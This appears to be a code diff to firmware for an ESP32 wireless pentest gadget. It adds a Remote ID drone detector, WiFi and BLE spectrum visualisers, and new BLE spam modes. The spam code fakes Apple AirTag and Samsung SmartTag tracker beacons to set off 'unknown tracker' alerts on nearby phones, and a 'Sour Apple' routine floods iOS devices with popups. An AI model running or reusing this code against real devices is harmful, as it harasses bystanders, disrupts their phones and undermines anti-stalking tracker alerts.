@@ -146,11 +146,14 @@ static bt_device_info_t bt_devices[BT_MAX_DEVICES];
 static int bt_device_count = 0;
 
 // BLE Spam attack state
-#define BLE_SPAM_MODE_APPLE   0
-#define BLE_SPAM_MODE_SAMSUNG 1
-#define BLE_SPAM_MODE_GOOGLE  2
-#define BLE_SPAM_MODE_WINDOWS 3
-#define BLE_SPAM_MODE_ALL     4
+#define BLE_SPAM_MODE_APPLE       0
+#define BLE_SPAM_MODE_SAMSUNG     1
+#define BLE_SPAM_MODE_GOOGLE      2
+#define BLE_SPAM_MODE_WINDOWS     3
+#define BLE_SPAM_MODE_ALL         4
+#define BLE_SPAM_MODE_AIRTAG      5
+#define BLE_SPAM_MODE_SMARTTAG    6
+#define BLE_SPAM_MODE_SOUR_APPLE  7
 static volatile bool ble_spam_active = false;
 static TaskHandle_t ble_spam_task_handle = NULL;
 static lv_obj_t *ble_spam_status_label = NULL;
@@ -410,6 +413,20 @@ typedef enum { WD_BAND_BOTH = 0, WD_BAND_24G, WD_BAND_5G } wd_band_t;
 
 // BLE PCAP capture
 #define BLE_PCAP_DIR         "/sdcard/lab/ble_captures"
+
+// Drone Detector — Remote ID (ASTM F3411-22a)
+#define DRONE_DETECT_DIR     "/sdcard/lab/dronedetect"
+#define DRONE_MAX            20
+#define DRONE_WIFI_PHASE_MS  10000   // ms per WiFi promiscuous pass
+#define DRONE_BLE_PHASE_MS    5000   // ms per BLE scan pass
+#define RID_SRC_BLE          0
+#define RID_SRC_WIFI         1
+#define RID_MSG_BASIC        0
+#define RID_MSG_LOC          1
+#define RID_MSG_SELFID       3
+#define RID_MSG_SYS          4
+#define RID_MSG_OPID         5
+#define RID_MSG_PACK         0xF
 
 // Touch calibration NVS
 #define TOUCH_CAL_NVS_NS      "touch_cal"
@@ -944,6 +961,31 @@ typedef struct {
     uint8_t  data[31];
     uint64_t timestamp_us;
 } ble_pcap_pkt_t;
+
+typedef struct {
+    char     uas_id[21];    // UAS serial / CAA / UTM ID (null-terminated)
+    uint8_t  id_type;       // 0=None 1=Serial 2=CAA 3=UTM 4=Session
+    uint8_t  ua_type;       // aircraft class (0=Undecl … 15=Other)
+    bool     has_loc;
+    double   lat, lon;      // drone GPS degrees
+    float    alt_geo;       // geodetic altitude m
+    float    alt_baro;      // barometric altitude m
+    float    speed;         // horizontal m/s
+    float    vert_speed;    // vertical m/s
+    uint16_t heading;       // 0-359 deg
+    bool     has_sys;
+    double   pilot_lat;     // operator lat
+    double   pilot_lon;     // operator lon
+    char     self_id[24];   // self-ID description text
+    char     op_id[21];     // operator ID
+    uint8_t  source;        // RID_SRC_BLE or RID_SRC_WIFI
+    int8_t   rssi;
+    uint8_t  mac[6];        // BLE addr or WiFi SA (NimBLE LE byte order)
+    uint32_t first_seen;    // seconds since boot
+    uint32_t last_seen;
+    uint32_t pkt_count;
+} drone_rec_t;
+
 static FILE          *ble_pcap_file      = NULL;
 static QueueHandle_t  ble_pcap_queue     = NULL;
 static lv_timer_t    *ble_pcap_timer     = NULL;
@@ -1217,6 +1259,107 @@ typedef struct {
 static QueueHandle_t deauth_pcap_queue = NULL;
 static FILE         *deauth_pcap_file  = NULL;
 static char          deauth_pcap_path[64] = "";
+
+// Drone Detector state
+static drone_rec_t   g_drones[DRONE_MAX];
+static int           g_drone_count        = 0;
+static portMUX_TYPE  g_drone_mux          = portMUX_INITIALIZER_UNLOCKED;
+static volatile bool drone_scan_active    = false;
+static volatile bool drone_update_flag    = false;
+static volatile bool drone_phase_ble      = false;  // false=WiFi, true=BLE
+static volatile int  drone_pcap_pkt_count = 0;
+static TaskHandle_t  drone_task_handle    = NULL;
+static StaticTask_t  drone_task_buf;
+static StackType_t  *drone_task_stack     = NULL;
+static lv_obj_t     *drone_list           = NULL;
+static lv_obj_t     *drone_status_lbl     = NULL;
+static lv_obj_t     *drone_count_lbl      = NULL;
+static lv_obj_t     *drone_rec_lbl        = NULL;
+static volatile bool drone_ui_active      = false;
+static FILE         *drone_csv            = NULL;
+static char          drone_csv_path[80];
+static QueueHandle_t drone_pcap_queue     = NULL;
+static FILE         *drone_pcap_file      = NULL;
+static char          drone_pcap_path[80];
+
+// ── WiFi Channel Analyzer (Chanalizer) state ─────────────────────────────────
+// Portrait layout: 240×320. Two-phase UI: SSID picker → bell-curve chart.
+// Chart is a 520px-wide PSRAM buffer displayed through a 240px-wide fixed canvas.
+// Manual wana_scroll_x tracks which 240px slice of the buffer is visible.
+// Auto-scrolls left↔right via lv_obj_invalidate() — no LVGL scroll container,
+// avoiding the layout cascade + child re-render overhead that causes WDT starvation.
+#define WANA_WIDE_W    520   // total chart canvas width  (frequency axis, px)
+#define WANA_CHART_H   200   // chart canvas height       (signal axis, px; 0=top=strong)
+#define WANA_2G_X        0   // 2.4 GHz band x-start
+#define WANA_2G_W      200   // 2.4 GHz band width
+#define WANA_SEP_X     200   // separator stripe x-start
+#define WANA_5G_X      208   // 5 GHz band x-start
+#define WANA_5G_W      312   // 5 GHz band width  (208+312=520)
+#define WANA_MAX_APS     48
+#define WANA_MAX_LABELS  48
+#define WANA_MAX_SSIDS   20   // max unique SSID groups shown in picker
+#define WANA_MAX_SCROLL  (WANA_WIDE_W - 240)   // 280
+
+typedef struct {
+    char    ssid[33];
+    int8_t  max_rssi;
+    uint8_t ap_count;
+    uint8_t ap_indices[8];   // indices into wana_aps[]
+    bool    selected;
+    uint8_t color_idx;
+} wana_ssid_group_t;
+
+static lv_color_t        *wana_buf           = NULL;   // PSRAM pixel buffer (520×200)
+static lv_obj_t          *wana_chart_obj     = NULL;   // 240-wide fixed-size draw object
+static lv_obj_t          *wana_status_lbl    = NULL;
+static lv_obj_t          *wana_panel         = NULL;   // swappable content panel
+static lv_timer_t        *wana_ui_timer      = NULL;
+static lv_timer_t        *wana_scroll_timer  = NULL;   // auto-scroll driver
+static bool               wana_active        = false;
+static bool               wana_scanning      = false;
+static bool               wana_needs_redraw  = false;
+static bool               wana_scroll_paused = false;  // true while user is dragging
+static int8_t             wana_scroll_dir    = 1;      // +1=right, -1=left (ping-pong)
+static int                wana_scroll_x      = 0;      // current viewport start in buf (0..280)
+static int                wana_drag_last_x   = 0;      // last touch x for delta calculation
+static wifi_ap_record_t   wana_aps[WANA_MAX_APS];
+static int                wana_ap_count      = 0;
+static lv_obj_t          *wana_ssid_lbls[WANA_MAX_LABELS];
+static int                wana_lbl_buf_x[WANA_MAX_LABELS];  // label x in buffer coords
+static int                wana_lbl_buf_y[WANA_MAX_LABELS];  // label y in buffer coords
+static int                wana_lbl_count     = 0;
+static wana_ssid_group_t  wana_ssids[WANA_MAX_SSIDS];
+static int                wana_ssid_count    = 0;
+
+// ── WiFi Band Scope state ────────────────────────────────────────────────────
+#define WSCOPE_W       240
+#define WSCOPE_SPEC_H   52
+#define WSCOPE_WF_H    148
+#define WSCOPE_CH_MAX   25
+static lv_color_t   *wscope_buf         = NULL;
+static lv_obj_t     *wscope_canvas      = NULL;
+static lv_obj_t     *wscope_status_lbl  = NULL;
+static lv_obj_t     *wscope_ax_lbl      = NULL;
+static lv_timer_t   *wscope_ui_timer    = NULL;
+static TaskHandle_t  wscope_task_handle = NULL;
+static volatile bool wscope_active      = false;
+static volatile bool wscope_5g_mode     = false;
+static volatile bool wscope_sweep_done  = false;
+static volatile int  wscope_cur_ch_idx  = 0;
+static portMUX_TYPE  wscope_mux         = portMUX_INITIALIZER_UNLOCKED;
+static int8_t        wscope_ch_peak[WSCOPE_CH_MAX];
+static uint16_t      wscope_ch_cnt[WSCOPE_CH_MAX];
+
+// ── BLE Band Scope state ─────────────────────────────────────────────────────
+static lv_color_t   *blescope_buf        = NULL;
+static lv_obj_t     *blescope_canvas     = NULL;
+static lv_obj_t     *blescope_status_lbl = NULL;
+static lv_timer_t   *blescope_ui_timer   = NULL;
+static volatile bool blescope_active     = false;
+static portMUX_TYPE  blescope_mux        = portMUX_INITIALIZER_UNLOCKED;
+static uint16_t      blescope_hist[WSCOPE_W];
+static volatile uint32_t blescope_pkt_total = 0;
+static volatile uint32_t blescope_win_pkts  = 0;
 
 // AirTag Scanner state
 static TaskHandle_t airtag_scan_task_handle = NULL;
@@ -1535,6 +1678,28 @@ static void reset_function_page_children(void) {
     airtag_scan_stats_label2 = NULL;
     airtag_scan_stats_label3 = NULL;
     airtag_view_tags_btn = NULL;
+    drone_list        = NULL;
+    drone_status_lbl  = NULL;
+    drone_count_lbl   = NULL;
+    drone_rec_lbl     = NULL;
+    drone_ui_active   = false;
+    // WiFi Analyzer cleanup
+    wana_chart_obj = NULL;
+    wana_status_lbl = NULL; wana_panel = NULL;
+    wana_lbl_count = 0; wana_ssid_count = 0; wana_scroll_x = 0;
+    wana_active = false; wana_scanning = false; wana_scroll_paused = false;
+    if (wana_scroll_timer) { lv_timer_del(wana_scroll_timer); wana_scroll_timer = NULL; }
+    if (wana_ui_timer)     { lv_timer_del(wana_ui_timer);     wana_ui_timer     = NULL; }
+    if (wana_buf)          { heap_caps_free(wana_buf);         wana_buf          = NULL; }
+    // WiFi Band Scope cleanup
+    wscope_canvas = NULL; wscope_status_lbl = NULL; wscope_active = false;
+    if (wscope_ui_timer) { lv_timer_del(wscope_ui_timer); wscope_ui_timer = NULL; }
+    if (wscope_buf)      { heap_caps_free(wscope_buf);     wscope_buf = NULL; }
+    // BLE Band Scope cleanup
+    blescope_canvas = NULL; blescope_status_lbl = NULL;
+    if (blescope_ui_timer) { lv_timer_del(blescope_ui_timer); blescope_ui_timer = NULL; }
+    if (blescope_buf)      { heap_caps_free(blescope_buf);     blescope_buf = NULL; }
+    if (blescope_active)   { blescope_active = false; ble_gap_disc_cancel(); }
     deauth_monitor_rec_label = NULL;
     bt_locator_content = NULL;
     bt_locator_list = NULL;
@@ -1807,6 +1972,15 @@ static const char* deauth_monitor_find_ssid_by_bssid(const uint8_t *bssid);
 static void show_airtag_scan_screen(void);
 static void airtag_scan_exit_cb(lv_event_t *e);
 static void airtag_scan_task(void *pvParameters);
+static void show_drone_detector_screen(void);
+static void drone_exit_cb(lv_event_t *e);
+static void drone_task(void *pvParameters);
+static void drone_show_detail(int idx);
+static void drone_row_tap_cb(lv_event_t *e);
+static void show_wifi_analyzer_screen(void);
+static void show_wscope_screen(void);
+static void show_blescope_screen(void);
+static void wscope_task(void *p);
 
 // BT Locator functions
 static void show_bt_locator_screen(void);
@@ -5256,8 +5430,8 @@ void app_main(void)
             }
             // If scan finished, build results UI (but not during blackout/snifferdog/sae_overflow/handshake/wardrive/karma attack/deauth_monitor/portal or when handshaker is waiting for scan)
             else if (scan_done_ui_flag) {
-                if (blackout_ui_active || snifferdog_ui_active || sae_overflow_ui_active || handshake_ui_active || wardrive_ui_active || karma_ui_active || deauth_monitor_ui_active || portal_ui_active || handshake_waiting_for_scan || g_handshaker_global_mode) {
-                    // During attacks or while waiting for scan, just clear the flag without showing results
+                if (blackout_ui_active || snifferdog_ui_active || sae_overflow_ui_active || handshake_ui_active || wardrive_ui_active || karma_ui_active || deauth_monitor_ui_active || portal_ui_active || handshake_waiting_for_scan || g_handshaker_global_mode || wana_active) {
+                    // During attacks/visualizers or while waiting for scan, just clear the flag without showing results
                     scan_done_ui_flag = false;
                 } else {
                 scan_done_ui_flag = false;
@@ -5683,9 +5857,10 @@ void app_main(void)
                 if (ble_spam_status_label && lv_obj_is_valid(ble_spam_status_label)
                     && ble_spam_active) {
                     static const char *s_mode_names[] = {
-                        "Apple", "Samsung", "Google", "Windows", "All"
+                        "Apple Prox. Pair", "Samsung", "Google", "Windows", "All",
+                        "Apple Find My", "Samsung SmartTag", "Sour Apple"
                     };
-                    int m = ble_spam_mode < 5 ? ble_spam_mode : 4;
+                    int m = (ble_spam_mode >= 0 && ble_spam_mode <= 7) ? ble_spam_mode : 4;
                     char sbuf[48];
                     snprintf(sbuf, sizeof(sbuf), "Sending: %s", s_mode_names[m]);
                     lv_label_set_text(ble_spam_status_label, sbuf);
@@ -5755,6 +5930,67 @@ void app_main(void)
                         lv_obj_set_width(lbl, lv_pct(95));
                     }
                     portEXIT_CRITICAL(&deauth_monitor_spin);
+                }
+            }
+
+            // Drone Detector UI update
+            if (drone_update_flag && drone_ui_active) {
+                drone_update_flag = false;
+
+                // Snapshot display lines under spinlock, then build UI outside it
+                typedef struct { char line[72]; uint8_t src; } dd_snap_t;
+                static dd_snap_t dd_snap[DRONE_MAX];
+                int dcnt;
+                portENTER_CRITICAL(&g_drone_mux);
+                dcnt = g_drone_count;
+                for (int di = 0; di < dcnt; di++) {
+                    drone_rec_t *r = &g_drones[di];
+                    dd_snap[di].src = r->source;
+                    if (r->uas_id[0])
+                        snprintf(dd_snap[di].line, 72, "[%s] %s  %ddBm",
+                                 r->source == RID_SRC_BLE ? "BLE" : "WiFi",
+                                 r->uas_id, r->rssi);
+                    else
+                        snprintf(dd_snap[di].line, 72, "[%s] %02X:%02X:%02X:%02X  %ddBm",
+                                 r->source == RID_SRC_BLE ? "BLE" : "WiFi",
+                                 r->mac[5],r->mac[4],r->mac[3],r->mac[2], r->rssi);
+                }
+                portEXIT_CRITICAL(&g_drone_mux);
+
+                if (drone_count_lbl && lv_obj_is_valid(drone_count_lbl)) {
+                    char cb[32]; snprintf(cb, sizeof(cb), "Drones detected: %d", dcnt);
+                    lv_label_set_text(drone_count_lbl, cb);
+                }
+                if (drone_status_lbl && lv_obj_is_valid(drone_status_lbl)) {
+                    if (drone_phase_ble)
+                        lv_label_set_text(drone_status_lbl, MY_SYMBOL_BLUETOOTH_B "  BLE scanning...");
+                    else
+                        lv_label_set_text(drone_status_lbl, LV_SYMBOL_WIFI "  WiFi NAN (ch 1/6/11)...");
+                }
+                if (drone_list && lv_obj_is_valid(drone_list)) {
+                    lv_obj_clean(drone_list);
+                    if (dcnt == 0) {
+                        lv_obj_t *emp = lv_label_create(drone_list);
+                        lv_label_set_text(emp, "Scanning... no Remote ID detected yet");
+                        lv_obj_set_style_text_font(emp, &lv_font_montserrat_12, 0);
+                        lv_obj_set_style_text_color(emp, lv_color_make(120,120,120), 0);
+                    }
+                    for (int di = 0; di < dcnt; di++) {
+                        lv_obj_t *row = lv_list_add_btn(drone_list, NULL, "");
+                        lv_obj_set_width(row, lv_pct(100));
+                        lv_obj_set_style_pad_all(row, 6, 0);
+                        lv_obj_set_height(row, LV_SIZE_CONTENT);
+                        lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
+                        lv_obj_set_style_radius(row, 8, 0);
+                        lv_obj_t *lbl = lv_label_create(row);
+                        lv_label_set_text(lbl, dd_snap[di].line);
+                        lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
+                        lv_obj_set_style_text_color(lbl, lv_color_hex(0x66BB6A), 0);
+                        lv_obj_set_width(lbl, lv_pct(95));
+                        lv_obj_add_event_cb(row, (lv_event_cb_t)drone_row_tap_cb,
+                                            LV_EVENT_CLICKED, (void*)(intptr_t)di);
+                    }
                 }
             }
 
@@ -6105,8 +6341,8 @@ void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data)
         data->point.y = point.y;
         data->state = LV_INDEV_STATE_PRESSED;
         touch_pressed_flag = true;
-        touch_x_flag = point.x;
-        touch_y_flag = point.y;
+        touch_x_flag = data->point.x;
+        touch_y_flag = data->point.y;
     } else {
         data->state = LV_INDEV_STATE_RELEASED;
         touch_pressed_flag = false;
@@ -11928,6 +12164,12 @@ static void main_tile_event_cb(lv_event_t *e)
         settings_nav_timer = lv_timer_create(settings_nav_timer_cb, 800, NULL);
     } else if (strcmp(tile_name, "Deauth Monitor") == 0) {
         show_deauth_monitor_screen();
+    } else if (strcmp(tile_name, "Drone Detect") == 0) {
+        show_drone_detector_screen();
+    } else if (strcmp(tile_name, "Chanalizer") == 0) {
+        show_wifi_analyzer_screen();
+    } else if (strcmp(tile_name, "WiFi Scope") == 0) {
+        show_wscope_screen();
     } else if (strcmp(tile_name, "Bluetooth") == 0) {
         show_bluetooth_screen();
     } else if (strcmp(tile_name, "Wardrive") == 0) {
@@ -14787,7 +15029,7 @@ static void show_wifi_menu_screen(void)
     lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
     lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
     lv_obj_set_style_border_width(tiles, 0, 0);
-    lv_obj_set_style_pad_all(tiles, 10, 0);
+    lv_obj_set_style_pad_all(tiles, 5, 0);
     lv_obj_set_style_pad_gap(tiles, 10, 0);
     lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
     lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
@@ -14800,6 +15042,12 @@ static void show_wifi_menu_screen(void)
     (void)dm_tile;
     lv_obj_t *obs_tile  = create_tile(tiles, LV_SYMBOL_EYE_OPEN,   "WiFi\nObserver",   UI_ACCENT_PURPLE, main_tile_event_cb, "WiFi Sniff&Karma");
     (void)obs_tile;
+    lv_obj_t *dd_tile   = create_tile(tiles, LV_SYMBOL_GPS,        "Drone\nDetect",    lv_color_hex(0x1B5E20), main_tile_event_cb, "Drone Detect");
+    (void)dd_tile;
+    lv_obj_t *wana_tile = create_tile(tiles, LV_SYMBOL_WIFI,       "Chan-\nalizer",    lv_color_hex(0x1A237E), main_tile_event_cb, "Chanalizer");
+    (void)wana_tile;
+    lv_obj_t *wscope_tile = create_tile(tiles, LV_SYMBOL_AUDIO,    "WiFi\nScope",      lv_color_hex(0x006064), main_tile_event_cb, "WiFi Scope");
+    (void)wscope_tile;
 }
 
 // WiFi Sniff & Karma screen
@@ -20681,6 +20929,10 @@ static void show_bluetooth_screen(void)
     // BLE PCAP - teal/purple
     lv_obj_t *pcap_tile = create_tile(tiles, LV_SYMBOL_SAVE, "BLE\nPCAP", lv_color_hex(0x00897B), NULL, NULL);
     lv_obj_add_event_cb(pcap_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE PCAP");
+
+    // BLE Band Scope - deep purple
+    lv_obj_t *blescope_tile = create_tile(tiles, LV_SYMBOL_AUDIO, "BLE\nScope", lv_color_hex(0x4A148C), NULL, NULL);
+    lv_obj_add_event_cb(blescope_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Scope");
 }
 
 // BT Locator screen - scan BT devices, select one, then track RSSI every 10s
@@ -21373,7 +21625,7 @@ static void bto_restore_screen(void)
     bto_status_lbl = lv_label_create(function_page);
     char sbuf[64];
     switch (bto_state) {
-        case BTO_STATE_DONE:    snprintf(sbuf, sizeof(sbuf), "Done — %d device(s) enumerated", bto_device_count); break;
+        case BTO_STATE_DONE:    snprintf(sbuf, sizeof(sbuf), "Done - %d device(s) enumerated", bto_device_count); break;
         case BTO_STATE_STOPPED: snprintf(sbuf, sizeof(sbuf), "Stopped"); break;
         default:                snprintf(sbuf, sizeof(sbuf), "%d device(s)", bto_device_count); break;
     }
@@ -22711,6 +22963,32 @@ static const uint8_t s_windows_sp_svc[] = {0x14,0xFE,0x80,0x00,0x00,0x00,0x00};
 static const uint8_t s_windows_sp_svc2[] = {0x14,0xFE,0x80,0x01,0x00,0x00,0x00};
 #define WINDOWS_PAYLOAD_COUNT 2
 
+// Apple Find My (AirTag) — manufacturer data format
+// key[0..5]  → MAC address (NimBLE val[] reversed, val[5] = key[0]|0xC0 for static-random)
+// key[6..27] → 22 advertisement payload bytes
+// hint byte  → key[0] >> 6 (top 2 bits)
+// Mfg data:  0x4C 0x00 0x12 0x19 <status:0x10> <key[6..27]:22> <hint:1> <pad:1>  = 29 bytes
+static const uint8_t s_airtag_keys[][28] = {
+    {0xBA,0x56,0xE9,0xAD,0xC7,0xF2, 0x3B,0x8E,0x11,0xCF,0x72,0xD4,0x55,0x9A,0x8B,0xE6,0x31,0xF8,0xA0,0x4C,0x97,0x1D,0xE5,0x43,0x80,0x2F,0xC9,0x71},
+    {0xD4,0x6F,0xC8,0x3E,0x11,0xA7, 0x5C,0x2B,0x9E,0x44,0x83,0x1A,0xF7,0xC3,0x60,0x2E,0x95,0xB8,0x47,0xD1,0x6A,0x09,0xF5,0x2C,0x74,0xE8,0xBB,0x51},
+    {0xC7,0x4A,0x17,0xB3,0x88,0x2C, 0xE1,0x53,0xF9,0x36,0x7D,0xA8,0x20,0xBE,0xC6,0x5F,0x48,0x9A,0xD3,0x71,0x85,0x1F,0xCE,0x7B,0x42,0xE0,0xA5,0x96},
+    {0x91,0xDE,0x55,0x7A,0x04,0xB8, 0xA2,0x6F,0x28,0xC3,0x8E,0x7B,0x5D,0x31,0x49,0x6A,0xBC,0x77,0xF2,0x04,0xED,0x93,0x18,0xB5,0x64,0xD7,0xC0,0x2E},
+    {0xE5,0x2B,0x9F,0x46,0xC1,0x73, 0x8D,0xF0,0x5A,0x17,0xB4,0x6C,0x39,0xA8,0x25,0xDE,0x7C,0x5B,0x80,0xF3,0x19,0xCA,0x65,0x40,0x2D,0x91,0xE8,0xB7},
+    {0x78,0xA3,0xC6,0x1E,0x50,0x9D, 0x4F,0xB2,0x87,0xD5,0x3C,0xE8,0xA1,0x6F,0x94,0x27,0xDB,0x53,0xB6,0x2A,0x08,0xF7,0xC4,0x39,0x15,0x6E,0xD2,0xA0},
+};
+#define AIRTAG_KEY_COUNT (int)(sizeof(s_airtag_keys)/sizeof(s_airtag_keys[0]))
+
+// Samsung SmartTag Offline Finding — service UUID 0xFD5A + 20-byte payload
+// Format: [UUID_lo UUID_hi] [mode:0x00] [privacy_id:12] [signature:4] [region:0x02] [aging:2]
+// Random Privacy ID + signature triggers Samsung "Unknown Tracker" alert on helper phones.
+static const uint8_t s_smarttag_payloads[][22] = {
+    {0x5A,0xFD, 0x00, 0xD1,0x3A,0x5C,0x72,0xF8,0x4B,0x91,0xE6,0x23,0xC0,0xB5,0x87, 0xA4,0x19,0x7E,0x32, 0x02, 0x00,0x01},
+    {0x5A,0xFD, 0x00, 0xA8,0x4F,0x1D,0x93,0xE5,0x67,0xB2,0x08,0xC7,0x5A,0x3E,0xD4, 0x6B,0xF3,0x85,0xC1, 0x02, 0x00,0x02},
+    {0x5A,0xFD, 0x00, 0x6C,0xB8,0x29,0x44,0x7E,0xA1,0x53,0xF0,0x8D,0x19,0xC6,0x2B, 0xE8,0x37,0xA2,0x54, 0x02, 0x00,0x03},
+    {0x5A,0xFD, 0x00, 0x35,0x7D,0xE2,0xB6,0x94,0x08,0xF5,0xC3,0x71,0xAE,0x4D,0x86, 0x93,0xC5,0x18,0x7D, 0x02, 0x00,0x04},
+};
+#define SMARTTAG_PAYLOAD_COUNT (int)(sizeof(s_smarttag_payloads)/sizeof(s_smarttag_payloads[0]))
+
 // ── SAS proceed wrappers — pre-set target from BT Scan & Select ──────────────
 static void ble_spoof_proceed_from_sas(void)
 {
@@ -22739,6 +23017,7 @@ static void ble_spam_task(void *pvParameters)
 {
     (void)pvParameters;
     int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
+    int airtag_idx = 0, smarttag_idx = 0, sour_apple_idx = 0;
     int mode_round = 0; // cycles through modes when ALL
 
     while (ble_spam_active) {
@@ -22762,13 +23041,21 @@ static void ble_spam_task(void *pvParameters)
 
         int cur_mode = ble_spam_mode;
         if (cur_mode == BLE_SPAM_MODE_ALL) {
-            cur_mode = mode_round % 4;
+            static const int all_modes[] = {
+                BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
+                BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
+                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
+                BLE_SPAM_MODE_SOUR_APPLE
+            };
+            cur_mode = all_modes[mode_round % 7];
             mode_round++;
         }
 
         bool use_svc = false;
         const uint8_t *svc_data = NULL;
         uint8_t svc_data_len = 0;
+        uint8_t at_mfg[29]; // AirTag Find My manufacturer data buffer
+        uint8_t sa_mfg[9];  // Sour Apple Nearby Action buffer
 
         switch (cur_mode) {
         case BLE_SPAM_MODE_APPLE:
@@ -22787,6 +23074,52 @@ static void ble_spam_task(void *pvParameters)
             svc_data_len = sizeof(s_google_fp_payloads[0]);
             google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
             break;
+        case BLE_SPAM_MODE_AIRTAG: {
+            // Apple Find My: MAC = key[0..5] (reversed, static-random bits set on val[5])
+            // Mfg data: company(2) + type 0x12(1) + len 0x19(1) + status(1) + key[6..27](22) + hint(1) + pad(1)
+            const uint8_t *k = s_airtag_keys[airtag_idx];
+            airtag_idx = (airtag_idx + 1) % AIRTAG_KEY_COUNT;
+            ble_addr_t at_addr;
+            at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
+            at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
+            at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
+            ble_hs_id_set_rnd(at_addr.val);
+            at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
+            at_mfg[2] = 0x12; at_mfg[3] = 0x19;
+            at_mfg[4] = 0x10;
+            memcpy(at_mfg + 5, k + 6, 22);
+            at_mfg[27] = (k[0] >> 6) & 0x03;
+            at_mfg[28] = 0x00;
+            fields.mfg_data = at_mfg;
+            fields.mfg_data_len = sizeof(at_mfg);
+            break;
+        }
+        case BLE_SPAM_MODE_SMARTTAG:
+            // Samsung SmartTag Offline Finding: service UUID 0xFD5A + 20-byte payload
+            // Triggers "Unknown Tracker" alert in Samsung SmartThings Find on helper phones.
+            use_svc = true;
+            svc_data = s_smarttag_payloads[smarttag_idx];
+            svc_data_len = sizeof(s_smarttag_payloads[0]);
+            smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
+            break;
+        case BLE_SPAM_MODE_SOUR_APPLE: {
+            // Apple Nearby Action (0x0F) — different from Proximity Pairing (0x10).
+            // Cycling through action types floods iOS with system-level popups:
+            // device setup, AirDrop, HomePod, Apple Watch pairing, AirPlay, Handoff.
+            static const uint8_t sa_actions[] = {
+                0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
+            };
+            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;   // Apple company ID
+            sa_mfg[2] = 0x0F;                        // Nearby Action type
+            sa_mfg[3] = 0x05;                        // action data length
+            sa_mfg[4] = 0xC1;                        // action flags
+            sa_mfg[5] = sa_actions[sour_apple_idx % (int)sizeof(sa_actions)];
+            sour_apple_idx++;
+            esp_fill_random(&sa_mfg[6], 3);          // random auth tag
+            fields.mfg_data     = sa_mfg;
+            fields.mfg_data_len = sizeof(sa_mfg);
+            break;
+        }
         case BLE_SPAM_MODE_WINDOWS:
         default:
             use_svc = true;
@@ -22885,7 +23218,7 @@ static void show_ble_spam_screen(void)
     lv_obj_align(mode_lbl, LV_ALIGN_TOP_LEFT, 8, 38);
 
     lv_obj_t *dd = lv_dropdown_create(function_page);
-    lv_dropdown_set_options(dd, "Apple (Sour Apple)\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms");
+    lv_dropdown_set_options(dd, "Apple Prox. Pair\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms\nApple Find My (AirTag)\nSamsung SmartTag\nSour Apple (iOS Popups)");
     lv_dropdown_set_selected(dd, (uint16_t)ble_spam_mode);
     lv_obj_set_size(dd, lv_pct(96), 36);
     lv_obj_align(dd, LV_ALIGN_TOP_MID, 0, 58);
@@ -23146,7 +23479,7 @@ static void show_ble_spoof_screen(void)
 
         if (bt_device_count == 0) {
             lv_obj_t *no_dev = lv_label_create(dev_list);
-            lv_label_set_text(no_dev, "No devices — run BLE Scan first");
+            lv_label_set_text(no_dev, "No devices - run BLE Scan first");
             lv_obj_set_style_text_font(no_dev, &lv_font_montserrat_12, 0);
             lv_obj_set_style_text_color(no_dev, ui_text_color(), 0);
         } else {
@@ -23435,7 +23768,7 @@ static void show_ble_disc_screen(void)
 
         if (bt_device_count == 0) {
             lv_obj_t *no_dev = lv_label_create(dev_list);
-            lv_label_set_text(no_dev, "No devices — run BLE Scan first");
+            lv_label_set_text(no_dev, "No devices - run BLE Scan first");
             lv_obj_set_style_text_font(no_dev, &lv_font_montserrat_12, 0);
             lv_obj_set_style_text_color(no_dev, ui_text_color(), 0);
         } else {
@@ -25504,6 +25837,15 @@ void attack_event_cb(lv_event_t *e)
         return;
     }
 
+    // BLE Band Scope
+    if (strcmp(attack_name, "BLE Scope") == 0) {
+        if (bt_lookout_is_active())
+            show_bt_conflict_warning("BLE Band Scope", show_blescope_screen);
+        else
+            show_blescope_screen();
+        return;
+    }
+
     // BT Attacks — active attacks guarded by authorization warning
     if (strcmp(attack_name, "BLE Spam") == 0) {
         show_attack_warning(show_ble_spam_screen);
@@ -27270,6 +27612,1709 @@ static void show_deauth_monitor_screen(void)
     // Start WiFi scan to gather network SSIDs
     ESP_LOGI(TAG, "Starting WiFi scan for deauth monitor...");
     wifi_scanner_start_scan();
+}
+
+// ============================================================================
+// DRONE DETECTOR — Remote ID (ASTM F3411-22a) via BLE + WiFi NAN/Beacon
+// Alternates 10 s WiFi promiscuous (ch 1/6/11) → 5 s BLE scan → repeat.
+// BLE packets are captured to PCAPNG; all parsed data logged to CSV.
+// ============================================================================
+
+static const char *drone_ua_str(uint8_t t) {
+    switch (t) {
+        case 1: return "Aeroplane"; case 2: return "Rotorcraft"; case 3: return "Gyroplane";
+        case 4: return "VTOL";      case 5: return "Ornithopter";case 6: return "Glider";
